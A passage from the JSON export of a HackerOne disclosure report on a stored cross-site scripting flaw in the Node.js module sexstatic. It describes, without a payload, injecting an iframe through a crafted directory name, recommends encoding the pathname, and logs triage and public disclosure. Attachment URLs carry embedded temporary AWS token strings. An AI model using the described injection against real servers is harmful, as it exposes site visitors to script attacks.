data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/274/225/760e2eda64a6eb3818eaaaf7bac420bbe6e120d3/sexstatic_xss.png?response-content-disposition=attachment%3B%20filename%3D%22sexstatic_xss.png%22%3B%20filename%2A%3DUTF-8%27%27sexstatic_xss.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T053603Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=0eed4319ebaf2b3b5c828c04606d63bf3ac1c01527c172d11422ea6d6e266e07\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/274/225/760e2eda64a6eb3818eaaaf7bac420bbe6e120d3/sexstatic_xss.png?response-content-disposition=attachment%3B%20filename%3D%22sexstatic_xss.png%22%3B%20filename%2A%3DUTF-8%27%27sexstatic_xss.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T053603Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026amp;X-Amz-Signature=0eed4319ebaf2b3b5c828c04606d63bf3ac1c01527c172d11422ea6d6e266e07\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003cp\u003e\u003ccode\u003epathname\u003c/code\u003e used in HTML output can be sanitized with the same \u003ccode\u003ehe.encode()\u003c/code\u003e function, as it is already done for every filename.\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eOperating system: Ubuntu 16.04\u003c/li\u003e\n\u003cli\u003eNode.js 8.9.4\u003c/li\u003e\n\u003cli\u003enpm v. 5.6.0\u003c/li\u003e\n\u003cli\u003eChromium  67.0.3367.0 (Developer Build) (64-bit)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"wrap-up\"\u003eWrap up\u003c/h2\u003e\n\n\u003cp\u003eI hope my report will help keeping Node.js Ecosystem users safe :)\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let him know: [N] \u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: [N] \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eRegards,\u003c/p\u003e\n\n\u003cp\u003eRafal \u0026#39;bl4de\u0026#39; Janicki\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eMalicious user is able to inject iframe element with malicious JavaScript code via crafted directory name and trick users to open this directory in the browser.\u003c/p\u003e\n","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":274225,"file_name":"sexstatic_xss.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/274/225/760e2eda64a6eb3818eaaaf7bac420bbe6e120d3/sexstatic_xss.png?response-content-disposition=attachment%3B%20filename%3D%22sexstatic_xss.png%22%3B%20filename%2A%3DUTF-8%27%27sexstatic_xss.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T053603Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026X-Amz-Signature=0eed4319ebaf2b3b5c828c04606d63bf3ac1c01527c172d11422ea6d6e266e07","file_size":80883,"type":"image/png"},{"id":274226,"file_name":"sexstatic_xss_1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/274/226/6c086ce3cc705e50964282ec247d7cd9b5e905f1/sexstatic_xss_1.png?response-content-disposition=attachment%3B%20filename%3D%22sexstatic_xss_1.png%22%3B%20filename%2A%3DUTF-8%27%27sexstatic_xss_1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRWTAI2C7%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T053603Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIA4OnjXKFXegILmjBXgWPi%2Bteogg5H0LMBKKhsAnJHN7AiB63uA2f%2F%2F5YDRnlhtKi%2FXhk22EJKrVEePJyA5BB6daFCq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM53ag7gGyZZO8130kKpEDyciZp2ZqDzsBi%2FORe9ONiGdtsWokZ6RNGwhOQ%2FCYjspqizBK8MFrrsG4EhCD7nQo3op7z5QpG4etJhRbGyk9ZMs1Bf11meT%2FBjo9u%2BckMiDjlcIlq5R15HOU7s1EHTqrLA36yUMOeyS29kSrYPqvMoLO2rWkUVucCUcQDlInVAw2uEr44ZvPlLBsyZb0G%2FT2OtLSV2vBgLI8dwRiyR%2B%2FkWbj5vpXWDXwAuLlH42qzINlU8oR6OvGnSCX5MCSpLVFjgxe2PhQ%2BxcvVQajoQ9vfI4lq%2FEF42OjdLcTp7fqirHlY5gZzbp%2B1h9WpBX1bN3bp5CKCkKnLhLqHodDNw6c1AzplZQntDSI7S7QWvohyZhSzrmIQHIVyNLGZgXx6b0918BQ6OX2S%2BdvH5OV4Wb7a7Im2%2FUTY072IM3MaRPN2Rpj1HVuQswZAJU0R8hS1MC9eqfkEttWFx0QKe6oUQCIGOaOP4bGspe1UVDGayXri6eNBeq8XJKWe0GMnG2omCWNNKKzrBDmqhOtnjYVc9W8bFQwytqq%2FwU67AE09XlDlPXYy%2BHJOKHdFHcwWreDNKw1sbWRzs1%2F5NkOvu7lAUwpxtXVP%2BePBhXceOPXQGHu9DsdsNPyO%2BGsOCZ66BYQBtsR104YSbyUKzHudK2y47O8h0exzqJ7%2BP3su6UkIEAf5z9ad88cXbwQThNPl6z3JfRt1ENAowPGLR%2F%2Frhm74kAezWUMRLV2tE7TC7gPDHdvS4bcrFlZ2adOF78IlYHd0DR95sTWHneHqzp4qzlglFCkHtDqf%2BuZWboHX83v76e19laPwMwL5yTDCuQHztQ0TyuFtL%2BCtEsk6OY%2BMny6lDUXH9NnZhbaIw%3D%3D\u0026X-Amz-Signature=2221d4aefd27f6ea8a7d7ba1ce89d7922cb6bb85f5e2d985d133d3338f199414","file_size":97880,"type":"image/png"}],"allow_singular_disclosure_at":"2018-06-28T10:45:40.965Z","allow_singular_disclosure_after":-79037422.91193235,"singular_disclosure_allowed":true,"vote_count":3,"voters":["eveeez","japz","0x08"],"severity":{"rating":"medium","score":5.2,"author_type":"Team","metrics":{"attack_vector":"local","attack_complexity":"low","privileges_required":"high","user_interaction":"required","scope":"changed","confidentiality":"low","integrity":"low","availability":"low"}},"structured_scope":{"databaseId":7998,"asset_type":"SOURCE_CODE","asset_identifier":"sexstatic","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2542864,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-29T07:38:37.197Z","updated_at":"2018-03-29T07:38:37.197Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"Other module","new_scope":"sexstatic","genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2542867,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @bl4de, \n\nThanks a lot for reporting the vulnerability.\nI will look at your report and triage it shortly!\n","markdown_message":"\u003cp\u003eHi @bl4de, \u003c/p\u003e\n\n\u003cp\u003eThanks a lot for reporting the vulnerability.\u003cbr\u003e\nI will look at your report and triage it shortly!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-29T07:41:06.506Z","updated_at":"2018-03-29T07:41:06.506Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2546967,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey @bl4de, I was able to reproduce this issue, thanks for reporting. I invited the author (gray@ruleless.org) as well.\n\nThanks!","markdown_message":"\u003cp\u003eHey \u003ca href=\"/bl4de\"\u003e@bl4de\u003c/a\u003e, I was able to reproduce this issue, thanks for reporting. I invited the author (\u003ca title=\"gray@ruleless.org\" href=\"mailto:gray@ruleless.org\" rel=\"nofollow noopener noreferrer\"\u003egray@ruleless.org\u003c/a\u003e) as well.\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-30T11:28:07.943Z","updated_at":"2018-03-30T11:28:07.943Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2546977,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-30T11:31:28.665Z","updated_at":"2018-03-30T11:31:28.665Z","additional_data":{"old_severity":"Medium","new_severity":"Medium (5.2)","old_severity_id":130879,"new_severity_id":133863},"actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2805810,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Looks like it is impossible to get in touch with the maintainer and the GitHub repo is configured to prevent creation of new issues.\n\n@bl4de I will disclose this if you don't mind.","markdown_message":"\u003cp\u003eLooks like it is impossible to get in touch with the maintainer and the GitHub repo is configured to prevent creation of new issues.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/bl4de\"\u003e@bl4de\u003c/a\u003e I will disclose this if you don\u0026#39;t mind.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-28T11:46:08.191Z","updated_at":"2018-05-28T11:46:08.191Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2805811,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @marcinhoppe \n\nI am fine with disclosure, thank you for handling the report!\n\nRegards,\n\nbl4de","markdown_message":"\u003cp\u003eHi \u003ca href=\"/marcinhoppe\"\u003e@marcinhoppe\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eI am fine with disclosure, thank you for handling the report!\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003c/p\u003e\n\n\u003cp\u003ebl4de\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-28T11:47:16.325Z","updated_at":"2018-05-28T11:47:16.325Z","actor":{"username":"bl4de","cleared":false,"url":"/bl4de","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2811628,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-29T10:45:25.117Z","updated_at":"2018-05-29T10:45:25.117Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"bl4de","url":"/bl4de"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2811630,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-29T10:45:40.888Z","updated_at":"2018-05-29T10:45:40.888Z","first_to_agree":true,"actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2811634,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-29T10:46:52.570Z","updated_at":"2018-05-29T10:46:52.570Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2812282,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-29T11:20:38.252Z","updated_at":"2018-05-29T11:20:38.252Z","additional_data":{"added_weaknesses":[{"id":62,"name":"Cross-site Scripting (XSS) - Stored"}],"removed_weaknesses":[{"id":60,"name":"Cross-site Scripting (XSS) - Generic"}]},"actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}